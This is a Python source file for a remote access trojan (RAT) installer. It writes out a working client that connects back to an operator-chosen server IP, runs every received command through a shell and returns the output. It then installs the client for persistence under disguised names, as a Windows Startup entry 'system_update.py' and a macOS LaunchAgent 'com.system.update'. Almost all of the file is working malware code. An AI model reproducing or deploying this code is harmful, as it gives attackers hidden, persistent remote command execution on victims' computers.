import os
import sys
import subprocess
import shutil
import platform
import re

# Template for the client code. Note the placeholder {SERVER_IP_PLACEHOLDER}.
CLIENT_CODE_TEMPLATE = """import socket
import subprocess
import os
import sys
import time

SERVER_IP = '{SERVER_IP_PLACEHOLDER}'  # IP inserted by installer
SERVER_PORT = 9999

def connect():
    while True:
        try:
            print(f"[*] Attempting to connect to {SERVER_IP}:{SERVER_PORT}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connection established successfully!")
            return s
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            print("[*] Waiting 10 seconds before retrying...")
            time.sleep(10)

def execute_command(command):
    #Executes a command and ensures output is ALWAYS returned.
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = process.communicate(timeout=30)
        
        output = stdout + stderr
        
        if not output:
            return f"[SUCCESS] Command '{command}' executed successfully. No output generated.".encode('utf-8')
        
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return f"[ERROR] Command timed out after 30 seconds.".encode('utf-8')
    except Exception as e:
        return f"[ERROR] {str(e)}".encode('utf-8')

def main():
    print("--- RAT Client Started ---")
    print("Waiting for commands. Will display received commands below.")
    
    while True:
        try:
            socket_conn = connect()
            while True:
                command = socket_conn.recv(1024).decode()
                
                if command.lower() == 'exit':
                    print("[!] Received 'exit' command. Closing connection.")
                    socket_conn.close()
                    break
                
                print(f"\\n[RECEIVED COMMAND]: {command}")

                output = execute_command(command)
                
                try:
                    sent = socket_conn.send(output)
                    if sent == 0:
                        print("[!] Failed to send data. Connection broken.")
                        break
                    print(f"[*] Sent {sent} bytes of response.")
                except Exception as e:
                    print(f"[!] Error sending response: {e}")
                    break
                
        except Exception as e:
            print(f"[-] Connection lost or error occurred: {e}")
            print("[*] Reconnecting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
"""

def is_valid_ip(ip):
    """Simple validation for IP address format."""
    pattern = re.compile(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return pattern.match(ip) is not None

def get_install_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif system == "Darwin":
        return os.path.expanduser("~/Library/LaunchAgents")
    elif system == "Linux":
        return "/usr/local/bin"
    return None

def install_persistence(script_path):
    system = platform.system()
    try:
        if system == "Windows":
            startup_path = get_install_path()
            dest_path = os.path.join(startup_path, "system_update.py")
            shutil.copy(script_path, dest_path)
            print(f"[+] Installed to Windows Startup: {dest_path}")
        elif system == "Darwin":
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.call(['launchctl', 'load', plist_path])
            print(f"[+] Installed macOS LaunchAgent: {plist_path}")
        elif system == "Linux":
            print("[*] Linux persistence requires root. Skipping automatic service creation.")
            print(f"[!] Manual Step: Add 'python3 {script_path}' to your startup applications.")
    except Exception as e:
        print(f"[-] Failed to install persistence: {e}")

def main():
    print("[*] RAT Client Installer (Interactive IP Configuration)")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    # --- INTERACTIVE IP INPUT ---
    while True:
        server_ip = input("\nEnter the Server IP address (e.g., 192.168.1.5 or 127.0.0.1): ").strip()
        if is_valid_ip(server_ip):
            print(f"[+] Valid IP address entered: {server_ip}")
            break
        else:
            print("[!] Invalid IP address format. Please try again.")
            print("    Example: 192.168.1.100 or 10.0.0.5")
    
    # Inject the IP into the code template
    final_client_code = CLIENT_CODE_TEMPLATE.replace("{SERVER_IP_PLACEHOLDER}", server_ip)
    
    script_name = "system_helper.py"
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"\n[*] Creating {script_name} with IP {server_ip}...")
    with open(script_path, "w") as f:
        f.write(final_client_code)
    
    print(f"[+] Created {script_path}")
    
    print("\n[*] Attempting to install persistence...")
    install_persistence(script_path)
    
    print(f"\n[!] The client is configured to connect to: {server_ip}")
    print(f"[!] To run manually for testing: {python_cmd} {script_path}")
    print("\n[!] Reminder: Ensure the server is running and listening on that IP before starting the client.")

if __name__ == "__main__":
    main()
